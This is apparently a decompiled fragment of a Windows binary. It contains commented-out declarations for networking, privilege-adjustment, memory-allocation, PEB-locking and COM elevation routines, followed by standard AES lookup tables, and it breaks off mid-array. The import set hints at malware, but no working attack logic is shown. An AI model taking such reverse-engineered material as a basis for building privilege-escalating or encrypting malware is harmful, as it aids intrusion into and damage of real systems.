// extern int (__stdcall *connect)(SOCKET s, const struct sockaddr *name, int namelen);
// extern unsigned int (__stdcall *inet_addr)(const char *cp);
// extern int (__stdcall *_WSAFDIsSet)(SOCKET fd, fd_set *);
// extern int (__stdcall *closesocket)(SOCKET s);
// extern int (__stdcall *select)(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);
// extern int (__stdcall *WSACleanup)();
// extern int (__stdcall *WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
// extern SOCKET (__stdcall *socket)(int af, int type, int protocol);
// extern void *(__cdecl *malloc)(size_t Size);
// extern void (__cdecl *free)(void *Block);
// extern NTSTATUS (__stdcall *RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN NewValue, BOOLEAN ForThread, PBOOLEAN OldValue);
// extern void (__stdcall *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
// extern NTSTATUS (__stdcall *NtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
// extern NTSTATUS (__stdcall *LdrEnumerateLoadedModules)(BOOLEAN ReservedFlag, PLDR_ENUM_CALLBACK EnumProc, PVOID Context);
// extern void (__stdcall *RtlAcquirePebLock)();
// extern void (__stdcall *RtlReleasePebLock)();
// extern HRESULT (__stdcall *CoGetObject)(LPCWSTR pszName, BIND_OPTS *pBindOptions, const IID *const riid, void **ppv);
// extern void (__stdcall *CoUninitialize)();
// extern HRESULT (__stdcall *CoInitializeEx)(LPVOID pvReserved, DWORD dwCoInit);
char RijnDael_AES_LONG_415370[256] =
{
  'c',
  '|',
  'w',
  '{',
  '\xF2',
  'k',
  'o',
  '\xC5',
  '0',
  '\x01',
  'g',
  '+',
  '\xFE',
  '\xD7',
  '\xAB',
  'v',
  '\xCA',
  '\x82',
  '\xC9',
  '}',
  '\xFA',
  'Y',
  'G',
  '\xF0',
  '\xAD',
  '\xD4',
  '\xA2',
  '\xAF',
  '\x9C',
  '\xA4',
  'r',
  '\xC0',
  '\xB7',
  '\xFD',
  '\x93',
  '&',
  '6',
  '?',
  '\xF7',
  '\xCC',
  '4',
  '\xA5',
  '\xE5',
  '\xF1',
  'q',
  '\xD8',
  '1',
  '\x15',
  '\x04',
  '\xC7',
  '#',
  '\xC3',
  '\x18',
  '\x96',
  '\x05',
  '\x9A',
  '\a',
  '\x12',
  '€',
  '\xE2',
  '\xEB',
  '\'',
  '\xB2',
  'u',
  '\t',
  '\x83',
  ',',
  '\x1A',
  '\x1B',
  'n',
  'Z',
  '\xA0',
  'R',
  ';',
  '\xD6',
  '\xB3',
  ')',
  '\xE3',
  '/',
  '\x84',
  'S',
  '\xD1',
  '\0',
  '\xED',
  ' ',
  '\xFC',
  '\xB1',
  '[',
  'j',
  '\xCB',
  '\xBE',
  '9',
  'J',
  'L',
  'X',
  '\xCF',
  '\xD0',
  '\xEF',
  '\xAA',
  '\xFB',
  'C',
  'M',
  '3',
  '\x85',
  'E',
  '\xF9',
  '\x02',
  '\x7F',
  'P',
  '<',
  '\x9F',
  '\xA8',
  'Q',
  '\xA3',
  '@',
  '\x8F',
  '\x92',
  '\x9D',
  '8',
  '\xF5',
  '\xBC',
  '\xB6',
  '\xDA',
  '!',
  '\x10',
  '\xFF',
  '\xF3',
  '\xD2',
  '\xCD',
  '\f',
  '\x13',
  '\xEC',
  '_',
  '\x97',
  'D',
  '\x17',
  '\xC4',
  '\xA7',
  '~',
  '=',
  'd',
  ']',
  '\x19',
  's',
  '`',
  '\x81',
  'O',
  '\xDC',
  '\"',
  '*',
  '\x90',
  '\x88',
  'F',
  '\xEE',
  '\xB8',
  '\x14',
  '\xDE',
  '^',
  '\v',
  '\xDB',
  '\xE0',
  '2',
  ':',
  '\n',
  'I',
  '\x06',
  '$',
  '\\',
  '\xC2',
  '\xD3',
  '\xAC',
  'b',
  '\x91',
  '\x95',
  '\xE4',
  'y',
  '\xE7',
  '\xC8',
  '7',
  'm',
  '\x8D',
  '\xD5',
  'N',
  '\xA9',
  'l',
  'V',
  '\xF4',
  '\xEA',
  'e',
  'z',
  '\xAE',
  '\b',
  '\xBA',
  'x',
  '%',
  '.',
  '\x1C',
  '\xA6',
  '\xB4',
  '\xC6',
  '\xE8',
  '\xDD',
  't',
  '\x1F',
  'K',
  '\xBD',
  '\x8B',
  '\x8A',
  'p',
  '>',
  '\xB5',
  'f',
  'H',
  '\x03',
  '\xF6',
  '\x0E',
  'a',
  '5',
  'W',
  '\xB9',
  '\x86',
  '\xC1',
  '\x1D',
  '\x9E',
  '\xE1',
  '\xF8',
  '\x98',
  '\x11',
  'i',
  '\xD9',
  '\x8E',
  '\x94',
  '\x9B',
  '\x1E',
  '\x87',
  '\xE9',
  '\xCE',
  'U',
  '(',
  '\xDF',
  '\x8C',
  '\xA1',
  '\x89',
  '\r',
  '\xBF',
  '\xE6',
  'B',
  'h',
  'A',
  '\x99',
  '-',
  '\x0F',
  '\xB0',
  'T',
  '\xBB',
  '\x16'
}; // weak
int dword_415470[256] =
{
  -1520213050,
  -2072216328,
  -1720223762,
  -1921287178,
  234025727,
  -1117033514,
  -1318096930,
  1422247313,
  1345335392,
  50397442,
  -1452841010,
  2099981142,
  436141799,
  1658312629,
  -424957107,
  -1703512340,
  1170918031,
  -1652391393,
  1086966153,
  -2021818886,
  368769775,
  -346465870,
  -918075506,
  200339707,
  -324162239,
  1742001331,
  -39673249,
  -357585083,
  -1080255453,
  -140204973,
  -1770884380,
  1539358875,
  -1028147339,
  486407649,
  -1366060227,
  1780885068,
  1513502316,
  1094664062,
  49805301,
  1338821763,
  1546925160,
  -190470831,
  887481809,
  150073849,
  -1821281822,
  1943591083,
  1395732834,
  1058346282,
  201589768,
  1388824469,
  1696801606,
  1589887901,
  672667696,
  -1583966665,
  251987210,
  -1248159185,
  151455502,
  907153956,
  -1686077413,
  1038279391,
  652995533,
  1764173646,
  -843926913,
  -1619692054,
  453576978,
  -1635548387,
  1949051992,
  773462580,
  756751158,
  -1301385508,
  -296068428,
  -73359269,
  -162377052,
  1295727478,
  1641469623,
  -827083907,
  2066295122,
  1055122397,
  1898917726,
  -1752923117,
  -179088474,
  1758581177,
  0,
  753790401,
  1612718144,
  536673507,
  -927878791,
  -312779850,
  -1100322092,
  1187761037,
  -641810841,
  1262041458,
  -565556588,
  -733197160,
  -396863312,
  1255133061,
  1808847035,
  720367557,
  -441800113,
  385612781,
  -985447546,
  -682799718,
  1429418854,
  -1803188975,
  -817543798,
  284817897,
  100794884,
  -2122350594,
  -263171936,
  1144798328,
  -1163944155,
  -475486133,
  -212774494,
  -22830243,
  -1069531008,
  -1970303227,
  -1382903233,
  -1130521311,
  1211644016,
  83228145,
  -541279133,
  -1044990345,
  1977277103,
  1663115586,
  806359072,
  452984805,
  250868733,
  1842533055,
  1288555905,
  336333848,
  890442534,
  804056259,
  -513843266,
  -1567123659,
  -867941240,
  957814574,
  1472513171,
  -223893675,
  -2105639172,
  1195195770,
  -1402706744,
  -413311558,
  723065138,
  -1787595802,
  -1604296512,
  -1736343271,
  -783331426,
  2145180835,
  1713513028,
  2116692564,
  -1416589253,
  -2088204277,
  -901364084,
  703524551,
  -742868885,
  1007948840,
  2044649127,
  -497131844,
  487262998,
  1994120109,
  1004593371,
  1446130276,
  1312438900,
  503974420,
  -615954030,
  168166924,
  1814307912,
  -463709000,
  1573044895,
  1859376061,
  -273896381,
  -1503501628,
  -1466855111,
  -1533700815,
  937747667,
  -1954973198,
  854058965,
  1137232011,
  1496790894,
  -1217565222,
  -1936880383,
  1691735473,
  -766620004,
  -525751991,
  -1267962664,
  -95005012,
  133494003,
  636152527,
  -1352309302,
  -1904575756,
  -374428089,
  403179536,
  -709182865,
  -2005370640,
  1864705354,
  1915629148,
  605822008,
  -240736681,
  -944458637,
  1371981463,
  602466507,
  2094914977,
  -1670089496,
  555687742,
  -582268010,
  -591544991,
  -2037675251,
  -2054518257,
  -1871679264,
  1111375484,
  -994724495,
  -1436129588,
  -666351472,
  84083462,
  32962295,
  302911004,
  -1553899070,
  1597322602,
  -111716434,
  -793134743,
  -1853454825,
  1489093017,
  656219450,
  -1180787161,
  954327513,
  335083755,
  -1281845205,
  856756514,
  -1150719534,
  1893325225,
  -1987146233,
  -1483434957,
  -1231316179,
  572399164,
  -1836611819,
  552200649,
  1238290055,
  -11184726,
  2015897680,
  2061492133,
  -1886614525,
  -123625127,
  -2138470135,
  386731290,
  -624967835,
  837215959,
  -968736124,
  -1201116976,
  -1019133566,
  -1332111063,
  1999449434,
  286199582,
  -877612933,
  -61582168,
  -692339859,
  974525996
}; // weak
int dword_415870[256] =
{
  1667483301,
  2088564868,
  2004348569,
  2071721613,
  -218956019,
  1802229437,
  1869602481,
  -976907948,
  808476752,
  16843267,
  1734856361,
  724260477,
  -16849127,
  -673729182,
  -1414836762,
  1987505306,
  -892694715,
  -2105401443,
  -909539008,
  2105408135,
  -84218091,
  1499050731,
  1195871945,
  -252642549,
  -1381154324,
  -724257945,
  -1566416899,
  -1347467798,
  -1667488833,
  -1532734473,
  1920132246,
  -1061119141,
  -1212713534,
  -33693412,
  -1819066962,
  640044138,
  909536346,
  1061125697,
  -134744830,
  -859012273,
  875849820,
  -1515892236,
  -437923532,
  -235800312,
  1903288979,
  -656888973,
  825320019,
  353708607,
  67373068,
  -943221422,
  589514341,
  -1010590370,
  404238376,
  -1768540255,
  84216335,
  -1701171275,
  117902857,
  303178806,
  -2139087973,
  -488448195,
  -336868058,
  656887401,
  -1296924723,
  1970662047,
  151589403,
  -2088559202,
  741103732,
  437924910,
  454768173,
  1852759218,
  1515893998,
  -1600103429,
  1381147894,
  993752653,
  -690571423,
  -1280082482,
  690573947,
  -471605954,
  791633521,
  -2071719017,
  1397991157,
  -774784664,
  0,
  -303185620,
  538984544,
  -50535649,
  -1313769016,
  1532737261,
  1785386174,
  -875852474,
  -1094817831,
  960066123,
  1246401758,
  1280088276,
  1482207464,
  -808483510,
  -791626901,
  -269499094,
  -1431679003,
  -67375850,
  1128498885,
  1296931543,
  859006549,
  -2054876780,
  1162185423,
  -101062384,
  33686534,
  2139094657,
  1347461360,
  1010595908,
  -1616960070,
  -1465365533,
  1364304627,
  -1549574658,
  1077969088,
  -1886452342,
  -1835909203,
  -1650646596,
  943222856,
  -168431356,
  -1128504353,
  -1229555775,
  -623202443,
  555827811,
  269492272,
  -6886,
  -202113778,
  -757940371,
  -842170036,
  202119188,
  320022069,
  -320027857,
  1600110305,
  -1751698014,
  1145342156,
  387395129,
  -993750185,
  -1482205710,
  2122251394,
  1027439175,
  1684326572,
  1566423783,
  421081643,
  1936975509,
  1616953504,
  -2122245736,
  1330618065,
  -589520001,
  572671078,
  707417214,
  -1869595733,
  -2004350077,
  1179028682,
  -286341335,
  -1195873325,
  336865340,
  -555833479,
  1583267042,
  185275933,
  -606360202,
  -522134725,
  842163286,
  976909390,
  168432670,
  1229558491,
  101059594,
  606357612,
  1549580516,
  -1027432611,
  -741098130,
  -1397996561,
  1650640038,
  -1852753496,
  -1785384540,
  -454765769,
  2038035083,
  -404237006,
  -926381245,
  926379609,
  1835915959,
  -1920138868,
  -707415708,
  1313774802,
  -1448523296,
  1819072692,
  1448520954,
  -185273593,
  -353710299,
  1701169839,
  2054878350,
  -1364310039,
  134746136,
  -1162186795,
  2021191816,
  623200879,
  774790258,
  471611428,
  -1499047951,
  -1263242297,
  -960063663,
  -387396829,
  -572677764,
  1953818780,
  522141217,
  1263245021,
  -1111662116,
  -1953821306,
  -1970663547,
  1886445712,
  1044282434,
  -1246400060,
  1718013098,
  1212715224,
  50529797,
  -151587071,
  235805714,
  1633796771,
  892693087,
  1465364217,
  -1179031088,
  -2038032495,
  -1044276904,
  488454695,
  -1633802311,
  -505292488,
  -117904621,
  -1734857805,
  286335539,
  1768542907,
  -640046736,
  -1903294583,
  -1802226777,
  -1684329034,
  505297954,
  -2021190254,
  -370554592,
  -825325751,
  1431677695,
  673730680,
  -538991238,
  -1936981105,
  -1583261192,
  -1987507840,
  218962455,
  -1077975590,
  -421079247,
  1111655622,
  1751699640,
  1094812355,
  -1718015568,
  757946999,
  252648977,
  -1330611253,
  1414834428,
  -1145344554,
  370551866
}; // weak
int dword_415C70[256] =
{
  1673962851,
  2096661628,
  2012125559,
  2079755643,
  -218165774,
  1809235307,
  1876865391,
  -980331323,
  811618352,
  16909057,
  1741597031,
  727088427,
  -18408962,
  -675978537,
  -1420958037,
  1995217526,
  -896580150,
  -2111857278,
  -913751863,
  2113570685,
  -84994566,
  1504897881,
  1200539975,
  -251982864,
  -1388188499,
  -726439980,
  -1570767454,
  -1354372433,
  -1675378788,
  -1538000988,
  1927583346,
  -1063560256,
  -1217019209,
  -35578627,
  -1824674157,
  642542118,
  913070646,
  1065238847,
  -134937865,
  -863809588,
  879254580,
  -1521355611,
  -439274267,
  -235337487,
  1910674289,
  -659852328,
  828527409,
  355090197,
  67636228,
  -946515257,
  591815971,
  -1013096765,
  405809176,
  -1774739050,
  84545285,
  -1708149350,
  118360327,
  304363026,
  -2145674368,
  -488686110,
  -338876693,
  659450151,
  -1300247118,
  1978310517,
  152181513,
  -2095210877,
  743994412,
  439627290,
  456535323,
  1859957358,
  1521806938,
  -1604584544,
  1386542674,
  997608763,
  -692624938,
  -1283600717,
  693271337,
  -472039709,
  794718511,
  -2079090812,
  1403450707,
  -776378159,
  0,
  -306107155,
  541089824,
  -52224004,
  -1317418831,
  1538714971,
  1792327274,
  -879933749,
  -1100490306,
  963791673,
  1251270218,
  1285084236,
  1487988824,
  -813348145,
  -793023536,
  -272291089,
  -1437604438,
  -68348165,
  1132905795,
  1301993293,
  862344499,
  -2062445435,
  1166724933,
  -102166279,
  33818114,
  2147385727,
  1352724560,
  1014514748,
  -1624917345,
  -1471421528,
  1369633617,
  -1554121053,
  1082179648,
  -1895462257,
  -1841320558,
  -1658733411,
  946882616,
  -168753931,
  -1134305348,
  -1233665610,
  -626035238,
  557998881,
  270544912,
  -1762561,
  -201519373,
  -759206446,
  -847164211,
  202904588,
  321271059,
  -322752532,
  1606345055,
  -1758092649,
  1149815876,
  388905239,
  -996976700,
  -1487539545,
  2130477694,
  1031423805,
  1690872932,
  1572530013,
  422718233,
  1944491379,
  1623236704,
  -2129028991,
  1335808335,
  -593264676,
  574907938,
  710180394,
  -1875137648,
  -2012511352,
  1183631942,
  -288937490,
  -1200893000,
  338181140,
  -559449634,
  1589437022,
  185998603,
  -609388837,
  -522503200,
  845436466,
  980700730,
  169090570,
  1234361161,
  101452294,
  608726052,
  1555620956,
  -1029743166,
  -742560045,
  -1404833876,
  1657054818,
  -1858492271,
  -1791908715,
  -455919644,
  2045938553,
  -405458201,
  -930397240,
  929978679,
  1843050349,
  -1929278323,
  -709794603,
  1318900302,
  -1454776151,
  1826141292,
  1454176854,
  -185399308,
  -355523094,
  1707781989,
  2062847610,
  -1371018834,
  135272456,
  -1167075910,
  2029029496,
  625635109,
  777810478,
  473441308,
  -1504185946,
  -1267480652,
  -963161658,
  -389340184,
  -576619299,
  1961401460,
  524165407,
  1268178251,
  -1117659971,
  -1962047861,
  -1978694262,
  1893765232,
  1048330814,
  -1250835275,
  1724688998,
  1217452104,
  50726147,
  -151584266,
  236720654,
  1640145761,
  896163637,
  1471084887,
  -1184247623,
  -2045275770,
  -1046914879,
  490350365,
  -1641563746,
  -505857823,
  -118811656,
  -1741966440,
  287453969,
  1775418217,
  -643206951,
  -1912108658,
  -1808554092,
  -1691502949,
  507257374,
  -2028629369,
  -372694807,
  -829994546,
  1437269845,
  676362280,
  -542803233,
  -1945923700,
  -1587939167,
  -1995865975,
  219813645,
  -1083843905,
  -422104602,
  1115997762,
  1758509160,
  1099088705,
  -1725321063,
  760903469,
  253628687,
  -1334064208,
  1420360788,
  -1150429509,
  371997206
}; // weak
int dword_416070[256] =
{
  -962239645,
  -125535108,
  -291932297,
  -158499973,
  -15863054,
  -692229269,
  -558796945,
  -1856715323,
  1615867952,
  33751297,
  -827758745,
  1451043627,
  -417726722,
  -1251813417,
  1306962859,
  -325421450,
  -1891251510,
  530416258,
  -1992242743,
  -91783811,
  -283772166,
  -1293199015,
  -1899411641,
  -83103504,
  1106029997,
  -1285040940,
  1610457762,
  1173008303,
  599760028,
  1408738468,
  -459902350,
  -1688485696,
  1975695287,
  -518193667,
  1034851219,
  1282024998,
  1817851446,
  2118205247,
  -184354825,
  -2091922228,
  1750873140,
  1374987685,
  -785062427,
  -116854287,
  -493653647,
  -1418471208,
  1649619249,
  708777237,
  135005188,
  -1789737017,
  1181033251,
  -1654733885,
  807933976,
  933336726,
  168756485,
  800430746,
  235472647,
  607523346,
  463175808,
  -549592350,
  -853087253,
  1315514151,
  2144187058,
  -358648459,
  303761673,
  496927619,
  1484008492,
  875436570,
  908925723,
  -592286098,
  -1259447718,
  1543217312,
  -1527360942,
  1984772923,
  -1218324778,
  2110698419,
  1383803177,
  -583080989,
  1584475951,
  328696964,
  -1493871789,
  -1184312879,
  0,
  -1054020115,
  1080041504,
  -484442884,
  2043195825,
  -1225958565,
  -725718422,
  -1924740149,
  1742323390,
  1917532473,
  -1797371318,
  -1730917300,
  -1326950312,
  -2058694705,
  -1150562096,
  -987041809,
  1340451498,
  -317260805,
  -2033892541,
  -1697166003,
  1716859699,
  294946181,
  -1966127803,
  -384763399,
  67502594,
  -25067649,
  -1594863536,
  2017737788,
  632987551,
  1273211048,
  -1561112239,
  1576969123,
  -2134884288,
  92966799,
  1068339858,
  566009245,
  1883781176,
  -251333131,
  1675607228,
  2009183926,
  -1351230758,
  1113792801,
  540020752,
  -451215361,
  -49351693,
  -1083321646,
  -2125673011,
  403966988,
  641012499,
  -1020269332,
  -1092526241,
  899848087,
  -1999879100,
  775493399,
  -1822964540,
  1441965991,
  -58556802,
  2051489085,
  -928226204,
  -1159242403,
  841685273,
  -426413197,
  -1063231392,
  429425025,
  -1630449841,
  -1551901476,
  1147544098,
  1417554474,
  1001099408,
  193169544,
  -1932900794,
  -953553170,
  1809037496,
  675025940,
  -1485185314,
  -1126015394,
  371002123,
  -1384719397,
  -616832800,
  1683370546,
  1951283770,
  337512970,
  -1831122615,
  201983494,
  1215046692,
  -1192993700,
  -1621245246,
  -1116810285,
  1139780780,
  -995728798,
  967348625,
  832869781,
  -751311644,
  -225740423,
  -718084121,
  -1958491960,
  1851340599,
  -625513107,
  25988493,
  -1318791723,
  -1663938994,
  1239460265,
  -659264404,
  -1392880042,
  -217582348,
  -819598614,
  -894474907,
  -191989126,
  1206496942,
  270010376,
  1876277946,
  -259491720,
  1248797989,
  1550986798,
  941890588,
  1475454630,
  1942467764,
  -1756248378,
  -886839064,
  -1585652259,
  -392399756,
  1042358047,
  -1763882165,
  1641856445,
  226921355,
  260409994,
  -527404944,
  2084716094,
  1908716981,
  -861247898,
  -1864873912,
  100991747,
  -150866186,
  470945294,
  -1029480095,
  1784624437,
  -1359390889,
  1775286713,
  395413126,
  -1722236479,
  975641885,
  666476190,
  -650583583,
  -351012616,
  733190296,
  573772049,
  -759469719,
  -1452221991,
  126455438,
  866620564,
  766942107,
  1008868894,
  361924487,
  -920589847,
  -2025206066,
  -1426107051,
  1350051880,
  -1518673953,
  59739276,
  1509466529,
  159418761,
  437718285,
  1708834751,
  -684595482,
  -2067381694,
  -793221016,
  -2101132991,
  699439513,
  1517759789,
  504434447,
  2076946608,
  -1459858348,
  1842789307,
  742004246
}; // weak
char RijnDael_AES_inv_LONG_416470[256] =
{
  'R',
  '\t',
  'j',
  '\xD5',
  '0',
  '6',
  '\xA5',
  '8',
  '\xBF',
  '@',
  '\xA3',
  '\x9E',
  '\x81',
  '\xF3',
  '\xD7',
  '\xFB',
  '|',
  '\xE3',
  '9',
  '\x82',
  '\x9B',
  '/',
  '\xFF',
  '\x87',
  '4',
  '\x8E',
  'C',
  'D',
  '\xC4',
  '\xDE',
  '\xE9',
  '\xCB',
  'T',
  '{',
  '\x94',
  '2',
  '\xA6',
  '\xC2',
  '#',
  '=',
  '\xEE',
  'L',
  '\x95',
  '\v',
  'B',
  '\xFA',
  '\xC3',
  'N',
  '\b',
  '.',
  '\xA1',
  'f',
  '(',
  '\xD9',
  '$',
  '\xB2',
  'v',
  '[',
  '\xA2',
  'I',
  'm',
  '\x8B',
  '\xD1',
  '%',
  'r',
  '\xF8',
  '\xF6',
  'd',
  '\x86',
  'h',
  '\x98',
  '\x16',
  '\xD4',
  '\xA4',
  '\\',
  '\xCC',
  ']',
  'e',
  '\xB6',
  '\x92',
  'l',
  'p',
  'H',
  'P',
  '\xFD',
  '\xED',
  '\xB9',
  '\xDA',
  '^',
  '\x15',
  'F',
  'W',
  '\xA7',
  '\x8D',
  '\x9D',
  '\x84',
  '\x90',
  '\xD8',
  '\xAB',
  '\0',
  '\x8C',
  '\xBC',
  '\xD3',
  '\n',
  '\xF7',
  '\xE4',
  'X',
  '\x05',
  '\xB8',
  '\xB3',
  'E',
  '\x06',
  '\xD0',
  ',',
  '\x1E',
  '\x8F',
  '\xCA',
  '?',
  '\x0F',
  '\x02',
  '\xC1',
  '\xAF',
  '\xBD',
  '\x03',
  '\x01',
  '\x13',
  '\x8A',
  'k',
  ':',
  '\x91',
  '\x11',
  'A',
  'O',
  'g',
  '\xDC',
  '\xEA',
  '\x97',
  '\xF2',
  '\xCF',
  '\xCE',
  '\xF0',
  '\xB4',
  '\xE6',
  's',
  '\x96',
  '\xAC',
  't',
  '\"',
  '\xE7',
  '\xAD',
  '5',
  '\x85',
  '\xE2',
  '\xF9',
  '7',
  '\xE8',
  '\x1C',
  'u',
  '\xDF',
  'n',
  'G',
  '\xF1',
  '\x1A',
  'q',
  '\x1D',
  ')',
  '\xC5',
  '\x89',
  'o',
  '\xB7',
  'b',
  '\x0E',
  '\xAA',
  '\x18',
  '\xBE',
  '\x1B',
  '\xFC',
  'V',
  '>',
  'K',
  '\xC6',
  '\xD2',
  'y',
  ' ',
  '\x9A',
  '\xDB',
  '\xC0',
  '\xFE',
  'x',
  '\xCD',
  'Z',
  '\xF4',
  '\x1F',
  '\xDD',
  '\xA8',
  '3',
  '\x88',
  '\a',
  '\xC7',
  '1',
  '\xB1',
  '\x12',
  '\x10',
  'Y',
  '\'',
  '€',
  '\xEC',
  '_',
  '`',
  'Q',
  '\x7F',
  '\xA9',
  '\x19',
  '\xB5',
  'J',
  '\r',
  '-',
  '\xE5',
  'z',
  '\x9F',
  '\x93',
  '\xC9',
  '\x9C',
  '\xEF',
  '\xA0',
  '\xE0',
  ';',
  'M',
  '\xAE',
  '*',
  '\xF5',
  '\xB0',
  '\xC8',
  '\xEB',
  '\xBB',
  '<',
  '\x83',
  'S',
  '\x99',
  'a',
  '\x17',
  '+',
  '\x04',
  '~',
  '\xBA',
  'w',
  '\xD6',
  '&',
  '\xE1',
  'i',
  '\x14',
  'c',
  'U',
  '!',
  '\f',
  '}'
}; // weak
int dword_416570[256] =
{
  1353184337,
  1399144830,
  -1012656358,
  -1772214470,
  -882136261,
  -247096033,
  -1420232020,
  -1828461749,
  1442459680,
  -160598355,
  -1854485368,
  625738485,
  -52959921,
  -674551099,
  -2143013594,
  -1885117771,
  1230680542,
  1729870373,
  -1743852987,
  -507445667,
  41234371,
  317738113,
  -1550367091,
  -956705941,
  -413167869,
  -1784901099,
  -344298049,
  -631680363,
  763608788,
  -752782248,
  694804553,
  1154009486,
  1787413109,
  2021232372,
  1799248025,
  -579749593,
  -1236278850,
  397248752,
  1722556617,
  -1271214467,
  407560035,
  -2110711067,
  1613975959,
  1165972322,
  -529046351,
  -2068943941,
  480281086,
  -1809118983,
  1483229296,
  436028815,
  -2022908268,
  -1208452270,
  601060267,
  -503166094,
  1468997603,
  715871590,
  120122290,
  63092015,
  -1703164538,
  -1526188077,
  -226023376,
  -1297760477,
  -1167457534,
  1552029421,
  723308426,
  -1833666137,
  -252573709,
  -1578997426,
  -839591323,
  -708967162,
  526529745,
  -1963022652,
  -1655493068,
  -1604979806,
  853641733,
  1978398372,
  971801355,
  -1427152832,
  111112542,
  1360031421,
  -108388034,
  1023860118,
  -1375387939,
  1186850381,
  -1249028975,
  90031217,
  1876166148,
  -15380384,
  620468249,
  -1746289194,
  -868007799,
  2006899047,
  -1119688528,
  -2004121337,
  945494503,
  -605108103,
  1191869601,
  -384875908,
  -920746760,
  0,
  -2088337399,
  1223502642,
  -1401941730,
  1316117100,
  -67170563,
  1446544655,
  517320253,
  658058550,
  1691946762,
  564550760,
  -783000677,
  976107044,
  -1318647284,
  266819475,
  -761860428,
  -1634624741,
  1338359936,
  -1574904735,
  1766553434,
  370807324,
  179999714,
  -450191168,
  1138762300,
  488053522,
  185403662,
  -1379431438,
  -1180125651,
  -928440812,
  -2061897385,
  1275557295,
  -1143105042,
  -44007517,
  -1624899081,
  -1124765092,
  -985962940,
  880737115,
  1982415755,
  -590994485,
  1761406390,
  1676797112,
  -891538985,
  277177154,
  1076008723,
  538035844,
  2099530373,
  -130171950,
  288553390,
  1839278535,
  1261411869,
  -214912292,
  -330136051,
  -790380169,
  1813426987,
  -1715900247,
  -95906799,
  577038663,
  -997393240,
  440397984,
  -668172970,
  -275762398,
  -951170681,
  -1043253031,
  -22885748,
  906744984,
  -813566554,
  685669029,
  646887386,
  -1530942145,
  -459458004,
  227702864,
  -1681105046,
  1648787028,
  -1038905866,
  -390539120,
  1593260334,
  -173030526,
  -1098883681,
  2090061929,
  -1456614033,
  -1290656305,
  999926984,
  -1484974064,
  1852021992,
  2075868123,
  158869197,
  -199730834,
  28809964,
  -1466282109,
  1701746150,
  2129067946,
  147831841,
  -420997649,
  -644094022,
  -835293366,
  -737566742,
  -696471511,
  -1347247055,
  824393514,
  815048134,
  -1067015627,
  935087732,
  -1496677636,
  -1328508704,
  366520115,
  1251476721,
  -136647615,
  240176511,
  804688151,
  -1915335306,
  1303441219,
  1414376140,
  -553347356,
  -474623586,
  461924940,
  -1205916479,
  2136040774,
  82468509,
  1563790337,
  1937016826,
  776014843,
  1511876531,
  1389550482,
  861278441,
  323475053,
  -1939744870,
  2047648055,
  -1911228327,
  -1992551445,
  -299390514,
  902390199,
  -303751967,
  1018251130,
  1507840668,
  1064563285,
  2043548696,
  -1086863501,
  -355600557,
  1537932639,
  342834655,
  -2032450440,
  -2114736182,
  1053059257,
  741614648,
  1598071746,
  1925389590,
  203809468,
  -1958134744,
  1100287487,
  1895934009,
  -558691320,
  -1662733096,
  -1866377628,
  1636092795,
  1890988757,
  1952214088,
  1113045200
}; // weak
int dword_416970[256] =
{
  -1477160624,
  1698790995,
  -1541989693,
  1579629206,
  1806384075,
  1167925233,
  1492823211,
  65227667,
  -97509291,
  1836494326,
  1993115793,
  1275262245,
  -672837636,
  -886389289,
  1144333952,
  -1553812081,
  1521606217,
  465184103,
  250234264,
  -1057071647,
  1966064386,
  -263421678,
  -1756983901,
  -103584826,
  1603208167,
  -1668147819,
  2054012907,
  1498584538,
  -2084645843,
  561273043,
  1776306473,
  -926314940,
  -1983744662,
  2039411832,
  1045993835,
  1907959773,
  1340194486,
  -1383534569,
  -1407137434,
  986611124,
  1256153880,
  823846274,
  860985184,
  2136171077,
  2003087840,
  -1368671356,
  -1602093540,
  722008468,
  1749577816,
  -45773031,
  1826526343,
  -126135625,
  -747394269,
  38499042,
  -1893735593,
  -1420466646,
  686535175,
  -1028313341,
  2076542618,
  137876389,
  -2027409166,
  -1514200142,
  1778582202,
  -2112426660,
  483363371,
  -1267095662,
  -234359824,
  -496415071,
  -187013683,
  -1106966827,
  1647628575,
  -22625142,
  1395537053,
  1442030240,
  -511048398,
  -336157579,
  -326956231,
  -278904662,
  -1619960314,
  275692881,
  -1977532679,
  115185213,
  88006062,
  -1108980410,
  -1923837515,
  1573155077,
  -737803153,
  357589247,
  -73918172,
  -373434729,
  1128303052,
  -1629919369,
  1122545853,
  -1953953912,
  1528424248,
  -288851493,
  175939911,
  256015593,
  512030921,
  0,
  -2038429309,
  -315936184,
  1880170156,
  1918528590,
  -15794693,
  948244310,
  -710001378,
  959264295,
  -653325724,
  -1503893471,
  1415289809,
  775300154,
  1728711857,
  -413691121,
  -1762741038,
  -1852105826,
  -977239985,
  551313826,
  1266113129,
  437394454,
  -1164713462,
  715178213,
  -534627261,
  387650077,
  218697227,
  -947129683,
  -1464455751,
  -1457646392,
  435246981,
  125153100,
  -577114437,
  1618977789,
  637663135,
  -177054532,
  996558021,
  2130402100,
  692292470,
  -970732580,
  -51530136,
  -236668829,
  -600713270,
  -2057092592,
  580326208,
  298222624,
  608863613,
  1035719416,
  855223825,
  -1591097491,
  798891339,
  817028339,
  1384517100,
  -473860144,
  380840812,
  -1183798887,
  1217663482,
  1693009698,
  -1929598780,
  1072734234,
  746411736,
  -1875696913,
  1313441735,
  -784803391,
  -1563783938,
  198481974,
  -2114607409,
  -562387672,
  -1900553690,
  -1079165020,
  -1657131804,
  -1837608947,
  -866162021,
  1182684258,
  328070850,
  -1193766680,
  -147247522,
  -1346141451,
  -2141347906,
  -1815058052,
  768962473,
  304467891,
  -1716729797,
  2098729127,
  1671227502,
  -1153705093,
  2015808777,
  408514292,
  -1214583807,
  -1706064984,
  1855317605,
  -419452290,
  -809754360,
  -401215514,
  -1679312167,
  913263310,
  161475284,
  2091919830,
  -1297862225,
  591342129,
  -1801075152,
  1721906624,
  -1135709129,
  -897385306,
  -795811664,
  -660131051,
  -1744506550,
  -622050825,
  1355644686,
  -158263505,
  -699566451,
  -1326496947,
  1303039060,
  76997855,
  -1244553501,
  -2006299621,
  523026872,
  1365591679,
  -362898172,
  898367837,
  1955068531,
  1091304238,
  493335386,
  -757362094,
  1443948851,
  1205234963,
  1641519756,
  211892090,
  351820174,
